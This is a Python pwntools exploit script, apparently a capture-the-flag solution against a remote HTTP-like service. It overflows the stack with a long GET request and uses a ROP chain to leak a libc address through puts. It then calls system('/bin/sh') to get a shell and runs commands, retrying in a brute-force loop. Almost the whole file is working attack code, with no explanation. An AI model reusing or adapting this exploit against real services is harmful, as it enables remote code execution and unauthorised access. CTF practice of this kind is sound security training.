from pwn import *

def bf():
    context.log_level='debug'
    p=remote("functf",18020)

    sleep(0.5)
    
    puts_got=0x601028
    printf_got=0x601040
    puts_plt=0x400750
    poprdi=0x400b63
    main  =0x400Ac8
    ret   =0x400af1
    
    STRGET=0x400BB0
    
    if sys.argv[1]=="3":
        off=int(sys.argv[2],10)
        #off=27 #find good value
    else:
        off=0
    payload=""
    payload="GET "
    payload+="A"*(0x68-len(payload))
    payload+="a"*off
    payload+=" HTTP/1.1"
    payload+="B"*15
    payload+="b"*5 #find good value
    payload+=p64(ret)*0x60
    payload+=p64(poprdi)
    payload+=p64(STRGET)
    payload+=p64(puts_plt)
    payload+=p64(poprdi)
    payload+=p64(printf_got)
    payload+=p64(puts_plt)
    payload+=p64(main)
    print 'payload len :',hex(len(payload))
    p.sendline(payload)
        
    buf=p.recvuntil("GET \n",timeout=3)
    print buf
    
    buf=p.recvline()
    libc_printf=u64(buf[-7:-7+6]+"\x00\x00")
    
    libc_elf=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    libc_base = libc_printf - libc_elf.sym["printf"]
    libc_system = libc_base + libc_elf.sym["system"]
    libc_bin_sh = libc_base + libc_elf.search("/bin/sh").next()
    print 'libc_printf:',hex(libc_printf)
    print 'libc_base=',hex(libc_base)
    sleep(1)
    
    payload=""
    payload="GET "
    payload+="A"*(0x68-len(payload))
    payload+="a"*off
    payload+=" HTTP/1.1"
    payload+="B"*15
    payload+="b"*5 #find good value
    payload+=p64(ret)*0x60
    payload+=p64(poprdi)
    payload+=p64(libc_bin_sh)
    payload+=p64(libc_system)
    p.sendline(payload)
    
    sleep(1)
    
    #p.sendline("id;ls -al")
    
    buf=p.recvline(timeout=3)
    print buf

    p.sendline("id")
    p.recvuntil("ad_stack_babe")
    p.interactive()

for k in range(20):
    try:
        bf()
    except Exception as ex: 
        print 'error :' , ex
        print "="*30, k, "="*30
        sleep(1)
        pass
